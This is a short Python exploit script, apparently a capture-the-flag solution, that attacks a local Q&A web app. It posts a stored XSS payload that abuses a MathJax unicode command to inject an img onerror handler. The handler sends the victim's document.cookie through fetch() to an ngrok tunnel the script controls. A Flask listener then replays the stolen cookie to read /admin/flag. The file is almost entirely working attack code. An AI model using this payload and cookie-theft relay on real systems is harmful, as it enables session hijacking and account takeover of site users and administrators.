import asyncio
import httpx
from pyngrok import ngrok
from flask import Flask, request, Response
# from flask import Flask, request
from threading import Thread
import re

PORT = 6666
TUNNEL = ngrok.connect(PORT, "tcp").public_url.replace("tcp://", "http://")

print("TUNNEL:", TUNNEL)

URL = "http://localhost:3000"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, verify=False)
        self.session = ""
    async def posting_xss_payload(self, payload: str):
        print(payload)
        r = await self.c.post('/ask',data={
            "content": payload
        })
        if 'Found' in r.text:
            question_id = re.findall(r'Found. Redirecting to (.*)', r.text)[0]
            print(question_id)
    
class API(BaseAPI):
    ...

    async def webServer(self):
        app = Flask(__name__)
        @app.get("/")
        async def home():
            get_c_params = request.args.get("c")
            if get_c_params:
                cookie,value = get_c_params.split("=")
                flag = await self.c.get('/admin/flag', cookies={cookie: value})
                print(flag.text)
                print(get_c_params)
            return "ok"
        return Thread(target=app.run, args=('0.0.0.0', PORT))
    

async def main():
    api = API()
    server = await api.webServer()
    server.start()
    payload = f"""fetch('{TUNNEL}?c='+document.cookie)"""
    await api.posting_xss_payload(f"""$\\unicode[some-font; color:red; height: 100000px;"><img src="" onerror="{payload}]{{x1234}}$""")
    server.join()
 
if __name__ == "__main__":
    asyncio.run(main())